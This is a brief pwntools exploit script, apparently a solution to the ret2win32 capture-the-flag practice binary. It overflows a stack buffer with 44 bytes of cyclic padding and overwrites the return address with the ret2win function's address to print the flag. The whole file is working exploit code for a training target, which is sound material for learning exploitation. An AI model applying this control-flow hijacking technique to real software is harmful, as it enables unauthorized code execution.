from pwn import *

elf = ELF("./ret2win32")
p = process(elf.path)

offset = 44
payload = cyclic(offset) + p32(elf.sym.ret2win)

p.sendline(payload)
p.recvuntil("your flag:\n")
print(p.recv().decode())
